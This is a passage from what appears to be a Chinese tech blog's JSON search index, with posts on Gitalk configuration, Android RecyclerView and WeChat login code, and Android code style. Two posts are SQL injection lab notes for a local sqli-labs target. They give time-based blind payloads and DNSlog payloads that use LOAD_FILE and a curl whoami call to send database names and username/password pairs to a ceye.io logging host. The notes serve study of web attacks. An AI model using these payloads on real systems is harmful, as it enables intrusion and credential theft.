distractionFreeMode: '{{ site.comments.distractionFreeMode }}'  // Facebook-like distraction free mode\n\t\t})\n\n\t\tgitalk.render('gitalk_container')\n\n## ERROR\n\n\tError: Validation Failed.\n\n\tgitalk 是基于gitment的 gitment的id 有个50字符的限制\n\t出现这个问题要检查是否id大于了50字符 \n\n\tid: location.pathname,      // Ensure uniqueness and length less than 50{{ page.title }}\n\n\t现在的式取用链接的路径把id修改成 文章标题 可以解决大部分\n\npost.html下的gitalk配置修改id  \n\n\tid: '{{ page.title }}'\n\n或者修改_config.yml  \n\n\tpermalink: /:title.html\n","tags":["blog","gitalk","jekyll"],"categories":["jekyll"]},{"title":"1.3.2-SQL注入-SQL盲注-时间盲注","url":"/post/4135600167.html","content":"\n## 时间盲注\n\n### 时间盲注原理\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/01.png)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/02.png)\n\n\n\n### 时间盲注方法\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/03.png)\n\t\n\thttp://localhost:90/Less-10/?id=1\" and if(left(user(),1)='a',0,sleep(3))--+\n\n\thttp://localhost:90/Less-10/?id=1\" and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='r',0,sleep(3))--+\n\n时间注入脚本  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/04.png)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/05.png)\n\n--- \n## links\n[时间盲注](https://mp.weixin.qq.com/s?__biz=MzIzNzExNzI5Ng==&mid=2648732982&idx=1&sn=159f2b13d7737232577ae11ccecb33d2&chksm=f0d95f29c7aed63f2e0aea215f57672f7282de08c47a1033e6b2cfe1fee5fb788b4c8de405c0&mpshare=1&scene=23&srcid=0702v4QOmQfViIjUPqq98LAc)\n","tags":["sql注入","sql盲注"],"categories":["web安全"]},{"title":"1.3.3-SQL注入-SQL盲注-Dnslog盲注","url":"/post/2964387005.html","content":"\n> 需要目标机器时windows系统\n\n## DnsLog盲注\n\n### DnsLog盲注原理\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/01.jpeg)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/02.jpeg)\nDnslog平台：http://ceye.io/  \n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/03.jpeg)\n\n\n\n\thttp://ceye.io/profile\n\tcurl mzq83x.ceye.io\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/05.png)\n\n\n\tcurl `whoami`.mzq83x.ceye.io\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/06.jpeg)\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/04.jpeg)\n\n\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/07.jpeg)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/08.jpeg)\n\n### DnsLog盲注方法\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/09.jpeg)\n\n\t核心语法： SELECT LOAD_FILE(CONCAT('\\\\\\\\',(select database()),'.mysql.r5ourp.ceye.io\\\\abc'));\n\tsql语句不能含有特殊符号\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/10.jpeg)\n\n\t查表\n\t?id=1' and LOAD_FILE(CONCAT('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.mysql.r5oup.ceye.io\\\\abc'))--+\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/11.jpeg)\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/12.jpeg)\n\n\t?id=1' and LOAD_FILE(CONCAT('\\\\\\\\',(select colum_name from information_schema.columns where table_name='users' limit 5,1),'.mysql.r5ourp.ceye.io\\\\abc'))--+\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/13.jpeg)\n\t\n\t?id=1' and LOAD_FILE(CONCAT('\\\\\\\\',(select concat(username,password) from security.users limit 0,1),'.mysql.r5ourp.ceye.io\\\\abc'))--+\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/14.jpeg)\n\n\t?id=1' and LOAD_FILE(CONCAT('\\\\\\\\',(select concat_ws('A',username,password) from security.users limit 0,1),'.mysql.r5ourp.ceye.io\\\\abc'))--+\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/15.jpeg)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/16.jpeg)\n\n\t?id=1' and LOAD_FILE(CONCAT('\\\\\\\\',(select hex('~',username,password) from security.users limit 0,1),'.mysql.r5ourp.ceye.io\\\\abc'))--+\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/17.jpeg)\n\n\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/18.jpeg)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/19.jpeg)\n\nhttps://github.com/ADOOO/DnslogSqlinj","tags":["sql注入","sql盲注"],"categories":["web安全"]},{"title":"recyclerview嵌套recyclerview","url":"/post/1015207598.html","content":"\n<!-- ![效果](http://upload-images.jianshu.io/upload_images/2590671-98e8c1814b5456e3.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240) -->\n\n![红色方框标出来的是recyclerview的item](http://upload-images.jianshu.io/upload_images/2590671-b73723cc237b3c76.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n实现思路就是在一个recyclerview的adapter中 在初始化一个recyclerview 的adapter\n\n布局文件\nactivity_main.xml\n\n\t<ScrollView xmlns:android=\"http://schemas.android.com/apk/res/android\"\n\t\txmlns:tools=\"http://schemas.android.com/tools\"\n\t\tandroid:id=\"@+id/activity_main\"\n\t\tandroid:layout_width=\"match_parent\"\n\t\tandroid:layout_height=\"match_parent\"\n\t\ttools:context=\"com.project.recyclerviewtest.MainActivity\">\n\n\t\t<RelativeLayout\n\t\t\tandroid:layout_width=\"match_parent\"\n\t\t\tandroid:layout_height=\"match_parent\">\n\n\t\t<ImageView\n\t\t\tandroid:id=\"@+id/image\"\n\t\t\tandroid:layout_width=\"match_parent\"\n\t\t\tandroid:layout_height=\"wrap_content\"\n\t\t\tandroid:src=\"@mipmap/ic_launcher\"/>\n\n\t\t<android.support.v7.widget.RecyclerView\n\t\t\tandroid:layout_below=\"@+id/image\"\n\t\t\tandroid:id=\"@+id/recyclerView\"\n\t\t\tandroid:layout_width=\"match_parent\"\n\t\t\tandroid:layout_height=\"wrap_content\">\n\t\t</android.support.v7.widget.RecyclerView>\n\t\t</RelativeLayout>\n\t</ScrollView>\n\n\nMainActivity.java\n\n\tprivate RecyclerView recyclerView;\n\n\tprivate BusinessAdapter businessAdapter;\n\n\tprivate List<Object> mDatas;\n\n\n\tprivate ImageView imageView;\n\n\t@Override\n\tprotected void onCreate(Bundle savedInstanceState) {\n\t\tsuper.onCreate(savedInstanceState);\n\t\tsetContentView(R.layout.activity_main);\n\t\tinitData();\n\t\trecyclerView = (RecyclerView) findViewById(R.id.recyclerView);\n\n\t\trecyclerView.setLayoutManager(new LinearLayoutManager(this));\n\t\tbusinessAdapter = new BusinessAdapter(this, mDatas);\n\t//        businessAdapter.setOnRecyclerViewListener(this);\n\n\t\trecyclerView.setAdapter(businessAdapter);\n\t\timageView = (ImageView) findViewById(R.id.image);\n\t\timageView.setOnClickListener(this);\n\t\tbusinessAdapter.setOnRecyclerViewListener(new BusinessAdapter.OnRecyclerViewListener() {\n\t\t\t@Override\n\t\t\tpublic void onBusinessImgClick(View view, int position) {\n\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onBusinessNameClick(View view, int position) {\n\n\t\t\t}\n\t\t});\n\t}\n\n\t// 数据\n\tprotected void initData() {\n\t\tmDatas = new ArrayList<>();\n\t\tList<ProductEntity> products = new ArrayList<>();\n\t\tfor (int i = 1; i < 10; i++) {\n\t\t\tProductEntity productEntity = new ProductEntity();\n\t\t\tproductEntity.setProductName(\"我是一个商品哈哈哈哈或或或\" + i);\n\t\t\tproductEntity.setProductImage(\"https://ss0.baidu.com/7Po3dSag_xI4khGko9WTAnF6hhy/image/h%3D200/sign=71cd4229be014a909e3e41bd99763971/472309f7905298221dd4c458d0ca7bcb0b46d442.jpg\");\n\t\t\tproductEntity.setProductPrice(\"99.\" + i);\n\t\t\tproducts.add(productEntity);\n\t\t}\n\t\tfor (int i = 1; i < 30; i++) {\n\t\t\tBusinessEntity entity = new BusinessEntity();\n\t\t\tentity.setBusinessName(\"ddddfsdfdsfsdfsdfzzzz\" + i);\n\t\t\tentity.setBusinessImage(\"https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1564533037,3918553373&fm=116&gp=0.jpg\");\n\t\t\tentity.setProducts(products);\n\t\t\tmDatas.add(entity);\n\t\t}\n\t}\n\nMainActivity 就是初始化数据和第一个recyclerview \n\n\nBusinessAdapter.java\n\n\tpublic class BusinessAdapter extends RecyclerView.Adapter<BusinessAdapter.MyViewHolder> {\n\n\t\tpublic interface OnRecyclerViewListener {\n\n\t\t\t// 点击商家图片\n\t\t\tvoid onBusinessImgClick(View view, int position);\n\n\t\t\t// 点击商家名称\n\t\t\tvoid onBusinessNameClick(View view, int position);\n\t\t}\n\n\t\tprivate OnRecyclerViewListener listener;\n\n\t\tprivate Context mContext;\n\n\t\tprivate List<Object> mData;\n\n\t\tpublic void setOnRecyclerViewListener(OnRecyclerViewListener mItemListener) {\n\t\t\tthis.listener = mItemListener;\n\n\t\t}\n\n\t\tpublic BusinessAdapter(Context context, List<Object> datas) {\n\t\t\tthis.mContext = context;\n\t\t\tthis.mData = datas;\n\t\t}\n\n\t\t@Override\n\t\tpublic MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {\n\t\t\tView view = LayoutInflater.from(mContext).inflate(R.layout.item_business, parent, false);\n\t\t\tMyViewHolder myViewHolder = new MyViewHolder(view);\n\t\t\treturn myViewHolder;\n\t\t}\n\n\t\t@Override\n\t\tpublic void onBindViewHolder(final MyViewHolder holder, final int position) {\n\t\t\tfinal BusinessEntity entity = (BusinessEntity) mData.get(position);\n\t\t\tholder.businessName.setText(entity.getBusinessName());\n\t\t\tGlide\n\t\t\t\t\t.with(mContext)\n\t\t\t\t\t.load(entity.getBusinessImage())\n\t\t\t\t\t.centerCrop()\n\t\t\t\t\t.placeholder(R.mipmap.ic_launcher)\n\t\t\t\t\t.crossFade()\n\t\t\t\t\t.into(holder.businessImg);\n\n\n\t\t\t// 关键代码\n\t\t\t//////////////////////////////////////////////////\n\t\t\tProductAdapter productAdapter = new ProductAdapter(mContext, entity.getProducts());\n\n\t\t\tLinearLayoutManager linearLayoutManager = new LinearLayoutManager(mContext);\n\t\t\tlinearLayoutManager.setOrientation(LinearLayoutManager.HORIZONTAL);\n\t\t\tholder.productList.setLayoutManager(linearLayoutManager);\n\t\t\tholder.productList.setAdapter(productAdapter);\n\t\t\tholder.productList.setVisibility(View.VISIBLE);\n\t\t\t/////////////////////////////////////////////////////\n\n\t\t\t// 是否点击收藏\n\t\t\tif (entity.isCollection()) {\n\t\t\t\tholder.collectionImg.setImageResource(R.mipmap.collection_true);\n\t\t\t} else {\n\t\t\t\tholder.collectionImg.setImageResource(R.mipmap.collection_false);\n\t\t\t}\n\n\t\t\tholder.isCollection.setOnClickListener(new View.OnClickListener() {\n\t\t\t\t@Override\n\t\t\t\tpublic void onClick(View view) {\n\t\t\t\t\tif (entity.isCollection()) {\n\t\t\t\t\t\t((BusinessEntity) mData.get(position)).setCollection(false);\n\t\t\t\t\t\tholder.collectionImg.setImageResource(R.mipmap.collection_false);\n\t\t\t\t\t} else {\n\t\t\t\t\t\t((BusinessEntity) mData.get(position)).setCollection(true);\n\t\t\t\t\t\tholder.collectionImg.setImageResource(R.mipmap.collection_true);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t});\n\n\t\t\tif (listener != null) {\n\t\t\t\t// 商家图片点击事件\n\t\t\t\tholder.businessImg.setOnClickListener(new View.OnClickListener() {\n\t\t\t\t\t@Override\n\t\t\t\t\tpublic void onClick(View view) {\n\t\t\t\t\t\tlistener.onBusinessImgClick(view, position);\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t\t// 商家名称点击事件\n\t\t\t\tholder.businessName.setOnClickListener(new View.OnClickListener() {\n\t\t\t\t\t@Override\n\t\t\t\t\tpublic void onClick(View view) {\n\t\t\t\t\t\tlistener.onBusinessNameClick(view, position);\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t}\n\t\t}\n\n\t\t@Override\n\t\tpublic int getItemCount() {\n\t\t\treturn mData.size();\n\t\t}\n\n\t\tclass MyViewHolder extends RecyclerView.ViewHolder {\n\n\t\t\tImageView businessImg;\n\t\t\tTextView businessName;\n\t\t\tLinearLayout isCollection;\n\t\t\tImageView collectionImg;\n\t\t\tRecyclerView productList;\n\n\t\t\tpublic MyViewHolder(View itemView) {\n\t\t\t\tsuper(itemView);\n\t\t\t\tbusinessImg = (ImageView) itemView.findViewById(R.id.businessImg_Iv);\n\t\t\t\tbusinessName = (TextView) itemView.findViewById(R.id.productName_Tv);\n\t\t\t\tisCollection = (LinearLayout) itemView.findViewById(R.id.isCollection_Ll);\n\t\t\t\tcollectionImg = (ImageView) itemView.findViewById(R.id.collection_Iv);\n\t\t\t\tproductList = (RecyclerView) itemView.findViewById(R.id.productRv);\n\t\t\t}\n\t\t}\n\n\t}\n\n\nBusinessAdapter 的item布局\n\nitem_business.xml\n\n\n![布局长这样](http://upload-images.jianshu.io/upload_images/2590671-3c5171bb38c178f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\t<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n\t\tandroid:layout_width=\"match_parent\"\n\t\tandroid:layout_height=\"wrap_content\"\n\t\tandroid:paddingBottom=\"10dp\">\n\t\t<LinearLayout\n\t\t\tandroid:layout_width=\"match_parent\"\n\t\t\tandroid:layout_height=\"wrap_content\"\n\t\t\tandroid:orientation=\"vertical\"\n\t\t\tandroid:padding=\"10dp\">\n\t\t<LinearLayout\n\t\t\tandroid:layout_margin=\"5dp\"\n\t\t\tandroid:padding=\"5dp\"\n\t\t\tandroid:background=\"@drawable/border\"\n\t\t\tandroid:orientation=\"horizontal\"\n\t\t\tandroid:layout_width=\"match_parent\"\n\t\t\tandroid:layout_height=\"60dp\">\n\t\t\t<ImageView\n\t\t\t\tandroid:id=\"@+id/businessImg_Iv\"\n\t\t\t\tandroid:layout_width=\"50dp\"\n\t\t\t\tandroid:layout_height=\"50dp\"\n\t\t\t\tandroid:src=\"@mipmap/ic_launcher\"/>\n\t\t\t<TextView\n\t\t\t\tandroid:id=\"@+id/productName_Tv\"\n\t\t\t\tandroid:paddingLeft=\"5dp\"\n\t\t\t\tandroid:layout_gravity=\"center_vertical\"\n\t\t\t\tandroid:layout_weight=\"1\"\n\t\t\t\tandroid:layout_width=\"wrap_content\"\n\t\t\t\tandroid:layout_height=\"wrap_content\"\n\t\t\t\tandroid:text=\"Burberry\"/>\n\n\t\t\t<LinearLayout\n\t\t\t\tandroid:id=\"@+id/isCollection_Ll\"\n\t\t\t\tandroid:layout_gravity=\"center_vertical\"\n\t\t\t\tandroid:orientation=\"vertical\"\n\t\t\t\tandroid:layout_width=\"wrap_content\"\n\t\t\t\tandroid:layout_height=\"wrap_content\">\n\t\t\t\t<ImageView\n\t\t\t\t\tandroid:id=\"@+id/collection_Iv\"\n\t\t\t\t\tandroid:layout_gravity=\"center\"\n\t\t\t\t\tandroid:layout_width=\"20dp\"\n\t\t\t\t\tandroid:layout_height=\"20dp\"\n\t\t\t\t\tandroid:src=\"@mipmap/ic_launcher\"/>\n\t\t\t\t<TextView\n\t\t\t\t\tandroid:layout_gravity=\"center\"\n\t\t\t\t\tandroid:layout_width=\"wrap_content\"\n\t\t\t\t\tandroid:layout_height=\"wrap_content\"\n\t\t\t\t\tandroid:text=\"收藏\"/>\n\t\t\t</LinearLayout>\n\t\t</LinearLayout>\n\t\t\t<android.support.v7.widget.RecyclerView\n\t\t\t\tandroid:id=\"@+id/productRv\"\n\t\t\t\tandroid:layout_width=\"match_parent\"\n\t\t\t\tandroid:layout_height=\"wrap_content\"\n\t\t\t\tandroid:layout_marginBottom=\"5dp\" />\n\n\t\t</LinearLayout>\n\n\t</RelativeLayout>\n\n\nProductAdapter.java\n\n\tpublic class ProductAdapter extends RecyclerView.Adapter<ProductAdapter.MyViewHolder> {\n\n\t\tDisplayMetrics dm;\n\n\t\tprivate Context mContext;\n\n\t\tprivate List<ProductEntity> mDatas;\n\n\t\tpublic ProductAdapter(Context context, List<ProductEntity> data) {\n\t\t\tthis.mContext = context;\n\t\t\tthis.mDatas = data;\n\n\t\t\tdm = new DisplayMetrics();\n\t\t\t((Activity) context).getWindowManager().getDefaultDisplay().getMetrics(dm);\n\t\t}\n\n\n\t\t@Override\n\t\tpublic ProductAdapter.MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {\n\t\t\tView view = LayoutInflater.from(mContext).inflate(R.layout.item_product, parent, false);\n\t\t\tMyViewHolder myViewHolderw = new MyViewHolder(view);\n\t\t\t//动态设置ImageView的宽高，根据自己每行item数量计算\n\t\t\t//dm.widthPixels-dip2px(20)即屏幕宽度-左右10dp+10dp=20dp再转换为px的宽度，最后/3得到每个item的宽高\n\t\t\tRelativeLayout.LayoutParams lp = new RelativeLayout.LayoutParams((dm.widthPixels - dip2px(20)) / 3, ViewGroup.LayoutParams.WRAP_CONTENT);\n\t\t\tview.setLayoutParams(lp);\n\t\t\treturn myViewHolderw;\n\t\t}\n\n\t\t@Override\n\t\tpublic void onBindViewHolder(ProductAdapter.MyViewHolder holder, int position) {\n\t\t\tProductEntity entity = mDatas.get(position);\n\t\t\tholder.productName.setText(entity.getProductName());\n\t\t\tholder.productPrice.setText(entity.getProductPrice());\n\t\t\tGlide\n\t\t\t\t\t.with(mContext)\n\t\t\t\t\t.load(entity.getProductImage())\n\t\t\t\t\t.centerCrop()\n\t\t\t\t\t.placeholder(R.mipmap.ic_launcher)\n\t\t\t\t\t.crossFade()\n\t\t\t\t\t.into(holder.productImg);\n\t//        holder.productImg.setImageResource(R.mipmap.ic_launcher);\n\t\t}\n\n\n\t\t@Override\n\t\tpublic int getItemCount() {\n\t\t\treturn mDatas.size();\n\t\t}\n\n\t\tclass MyViewHolder extends RecyclerView.ViewHolder {\n\n\t\t\tImageView productImg;\n\t\t\tTextView productName;\n\t\t\tTextView productPrice;\n\n\t\t\tpublic MyViewHolder(View itemView) {\n\t\t\t\tsuper(itemView);\n\t\t\t\tproductImg = (ImageView) itemView.findViewById(R.id.productImg_Iv);\n\t\t\t\tproductName = (TextView) itemView.findViewById(R.id.productName_Tv);\n\t\t\t\tproductPrice = (TextView) itemView.findViewById(R.id.productPrice_Tv);\n\t\t\t}\n\t\t}\n\n\n\t\tint dip2px(float dpValue) {\n\t\t\tfinal float scale = mContext.getResources().getDisplayMetrics().density;\n\t\t\treturn (int) (dpValue * scale + 0.5f);\n\t\t}\n\t}\n\n\n\nitem_product.xml\n\n\t<LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n\t\tandroid:orientation=\"vertical\"\n\t\tandroid:layout_width=\"wrap_content\"\n\t\tandroid:layout_height=\"wrap_content\">\n\n\t\t<ImageView\n\t\t\tandroid:id=\"@+id/productImg_Iv\"\n\t\t\tandroid:layout_gravity=\"center\"\n\t\t\tandroid:layout_width=\"wrap_content\"\n\t\t\tandroid:layout_height=\"match_parent\"\n\t\t\tandroid:src=\"@mipmap/ic_launcher\"/>\n\t\t<TextView\n\t\t\tandroid:id=\"@+id/productName_Tv\"\n\t\t\tandroid:layout_width=\"wrap_content\"\n\t\t\tandroid:layout_height=\"wrap_content\" />\n\t\t<LinearLayout\n\t\t\tandroid:layout_width=\"wrap_content\"\n\t\t\tandroid:layout_height=\"wrap_content\"\n\t\t\tandroid:orientation=\"horizontal\">\n\t\t\t<TextView\n\t\t\t\tandroid:layout_width=\"wrap_content\"\n\t\t\t\tandroid:layout_height=\"wrap_content\"\n\t\t\t\tandroid:text=\"￥\"/>\n\t\t\t<TextView\n\t\t\t\tandroid:id=\"@+id/productPrice_Tv\"\n\t\t\t\tandroid:layout_width=\"wrap_content\"\n\t\t\t\tandroid:layout_height=\"wrap_content\"\n\t\t\t\tandroid:text=\"99.00\"/>\n\t\t</LinearLayout>\n\n\t</LinearLayout>\n","tags":["adnroid","recyclerview"],"categories":["android"]},{"title":"android微信第三方登录2","url":"/post/273860866.html","content":"\n\n利用http与微信通信换取用户信息和openid  \n使用了okhttp作为http通信的框架  \n\n------------------------------------\n1. 首先实例化okhttp连接  \n\n\t`private final OkHttpClient client = new OkHttpClient();`\n\n\n###### 获得code\n\n\tcase BaseResp.ErrCode.ERR_OK:\n\t//      可用以下两种方法获得code\n\t//      resp.toBundle(bundle);\n\t//      Resp sp = new Resp(bundle);\n\t//      String code = sp.code;\n\t//      或者\n\tString code = ((SendAuth.Resp) baseResp).code;\n\tString state = ((SendAuth.Resp) baseResp).state;\n\tToast.makeText(getApplicationContext(), \"恭喜这是你的code\" + code, Toast.LENGTH_LONG).show();\n\tLog.e(TAG, \"onResp: \" + code);\n\ttry {\n\t\tgetAccess_token(code);\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n\t//上面的code就是接入指南里要拿到的code\n\tbreak;\n\n-------------------------------------------\n###### 根据code获取用户信息\n\n\tprivate void getAccess_token(String code) throws Exception {\n\t\tString url = \"https://api.weixin.qq.com/sns/oauth2/access_token?\" +\n\t\t\t\t\"appid=\" + ConfigUtil.Wechat_Appid +\n\t\t\t\t\"&secret=\" + ConfigUtil.Wechat_AppSecret +\n\t\t\t\t\"&code=\" + code +\n\t\t\t\t\"&grant_type=authorization_code\";\n\t\trun(url);\n\t}\n\n-----------------------------------------\n###### 引入okhttp包\n\n![引入okhttp的包](http://upload-images.jianshu.io/upload_images/2590671-e535b2d91c6473b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n\t//通过http与微信通信\n    public void run(String url) throws Exception {\n\tfinal Request request = new Request.Builder()\n\t\t\t//.url(\"http://publicobject.com/helloworld.txt\")\n\t\t\t.url(url)\n\t\t\t.get()\n\t\t\t.build();\n\n\tclient.newCall(request).enqueue(new Callback() {\n\t\t@Override\n\t\tpublic void onFailure(Call call, IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\n\t\t@Override\n\t\tpublic void onResponse(Call call, Response response) throws IOException {\n\t\t\tif (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\t\t\ttry {\n\t\t\t\tString responseStr=response.body().string();\n\t\t\t\tJSONObject jsonObject = new JSONObject(responseStr);\n\t\t\t\tSystem.out.println(TAG + jsonObject.getString(\"access_token\"));//在回调中获取access_token\n\t\t\t} catch (JSONException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t} catch (Exception e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\n\n\t\t}\n\t});\n\t}\n\n##### 注意：\n如果微信调不起来  \n仔细检查签名是否正确  \n如果修改过签名  \n可以重新安装下微信再试一下  ","tags":["android","weixin"],"categories":["android"]},{"title":"android 代码样式规范","url":"/post/208407023.html","content":"\n原文地址 把重点记录下  \nhttps://source.android.com/source/code-style.html\n\n\n1.不要忽略异常(空的catch字句)  \n\n  不要不捕获异常  \n\n![推荐方式](http://upload-images.jianshu.io/upload_images/2590671-d9e8766c47552fe2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![推荐方式](http://upload-images.jianshu.io/upload_images/2590671-f182ce0036e28095.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n2.不要使用Findlizer  \n\nFinalizer是一种在对象被垃圾回收时执行一段代码的方法。虽然他们可以方便地进行清理（特别是外部资源），但是没有保证什么时候调用终结器（甚至会被调用）。  \n\nAndroid不使用finalizer。在大多数情况下，您可以从具有良好异常处理的终结器中完成所需的操作。如果你绝对需要它，定义一个close（）方法（或类似的），并准确地记录该方法需要被调用时（见InputStream的例子）。在这种情况下，只要不希望溢出日志，就可以打印来自终结器的短日志消息，但不是必需的。  \n\n\n3.Java库规则  \n\n旧的代码使用旧的库 在创建新的组件不要使用不推荐使用的库  \n\n有使用Android的Java库和工具的约定。在某些情况下，约定以重要的方式发生了变化，较旧的代码可能使用已弃用的模式或库。当使用这样的代码，可以继续现有的风格。但是，在创建新组件时，不要使用不推荐使用的库。  \n\n\n4.Java风格规则  \n\n使用Javadoc标准注释  \n\n每个文件应在顶部有一个版权声明，其后是package和import语句（每个块由空行分隔），最后是类或接口声明。在Javadoc注释中，描述类或接口的作用。  \n\n\n![注释规范](http://upload-images.jianshu.io/upload_images/2590671-a2b0703f23b915d5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n你写的每个类和公共方法必须包含一个Javadoc注释，至少有一个句子描述类或方法的作用。这句话应以第三人称描述性动词开始。  \n\n![注释规范](http://upload-images.jianshu.io/upload_images/2590671-cf5bed56f9efa6b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n![注释规范](http://upload-images.jianshu.io/upload_images/2590671-1e56e232fb5d1867.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n如何为javadoc编写注释 [http://www.oracle.com/technetwork/java/javase/documentation/index-137868.html]  \n\n\n5.写短的方法  \n\n如果一个方法超过40行左右，考虑它是否可以分解而不伤害程序的结构。  \n\n\n6.在标准位置定义字段  \n\n在文件的顶部或在使用它们的方法之前定义字段。  \n\n\n7.限制变量范围  \n\n将局部变量范围保持最小  \n循环变量应在for语句本身中声明  \n\n\n8.次序导入语句  \n\n  android import   \n  第三方 import  \n  java 和 javax  \n\n\n9.使用缩进空格  \n我们使用四（4）个空格缩进块，而不是制表符。当有疑问时，要与周围的代码一致。  \n\n我们使用八（8）个空格缩进进行换行，包括函数调用和赋值。例如，这是正确的：  \n\n![缩进](http://upload-images.jianshu.io/upload_images/2590671-f7ba99e90aa951eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n10.遵循字段命名约定  \n\n非公共，非静态字段名以m开头。  \n静态字段名称以s开头。  \n其他字段以小写字母开头。  \n公共静态最终字段（常量）为ALL_CAPS_WITH_UNDERSCORES。  \n\n![命名规范](http://upload-images.jianshu.io/upload_images/2590671-bb7f60ad6182be61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n11.使用标准括号样式  \n大括号不要自己一行; 大括号和代码在同一行：  \n\n![标准括号](http://upload-images.jianshu.io/upload_images/2590671-2a03544c67f34cbf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n我们需要在条件语句周围添加括号。异常：如果整个条件（条件和主体）适合一行，你可以（但没有义务）把它全部放在一行上。例如，这是可以接受的：  \n\n![括号规范](http://upload-images.jianshu.io/upload_images/2590671-851b61c733681703.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n12.限制线长度  \n\n代码中的每行文字长度最多为100个字符。虽然许多讨论都围绕这个规则，但是决定仍然是100个字符是最大值，以下例外：  \n\n如果注释行包含示例命令或长度超过100个字符的文字URL，则该行可能长于100个字符，以便于剪切和粘贴。  \n导入行可以超过限制，因为人们很少看到它们（这也简化了工具写入）。  \n使用标准Java注释  \n\n注释应该在同一语言元素的其他修饰符之前。简单的标记注释（例如@Override）可以与语言元素列在同一行。如果有多个注释或参数化注释，它们应按字母顺序逐行列出。  \n\n\n13.使用标准Java注释  \n\n注释应该在同一语言元素的其他修饰符之前。简单的标记注释（例如@Override）可以与语言元素列在同一行。如果有多个注释或参数化注释，它们应按字母顺序逐行列出。  \n\nJava中的三个预定义注释的Android标准实践是：  \n\n@Deprecated：当不建议使用注释元素时，必须使用@Deprecated注释。如果使用@Deprecated注释，则还必须具有@deprecated Javadoc标记，并且应该命名替代实现。此外，请记住，一个@Deprecated方法 仍然应该工作。如果您看到旧代码带有@deprecated Javadoc标记，请添加@Deprecated注释。  \n@Override：当方法从超类覆盖声明或实现时，必须使用@Override注释。例如，如果使用@inheritdocs Javadoc标记，并从类（而不是接口）派生，则还必须注释该方法@覆盖父类的方法。  \n@SuppressWarnings：@SuppressWarnings注释只应在不可能消除警告的情况下使用。如果警告通过此“不可能消除”测试，则必须使用@SuppressWarnings注释，以确保所有警告都反映代码中的实际问题。  \n当需要@SuppressWarnings注释时，必须以TODO注释作为前缀，解释“不可能消除”条件。这通常会识别具有尴尬界面的违规类。例如：  \n\n// TODO: The third-party class com.third.useful.Utility.rotate() needs generics\n@SuppressWarnings(\"generic-cast\")\nList<String> blix = Utility.rotate(blax);\n当需要@SuppressWarnings注释时，应重构代码以隔离应用注释的软件元素。  \n\n\n![注释](http://upload-images.jianshu.io/upload_images/2590671-0ed9e09a961a4e04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n14.将首字母缩略词作为词  \n\n将缩写词和缩写词作为命名变量，方法和类中的单词，以使名称更易读：  \n\n![命名](http://upload-images.jianshu.io/upload_images/2590671-9176c57a4abf2d68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n由于JDK和Android代码库在首字母缩略词之间非常不一致，因此几乎不可能与周围的代码一致。因此，始终将首字母缩写作为词。  \n\n\n15.使用TODO注释  \n\n使用TODO注释代码是临时的，短期的解决方案，或者足够好但不完美的代码。TODO应在所有大写字母中包含字符串TODO，后跟冒号：  \n\n  // TODO: Remove this code after the UrlTable2 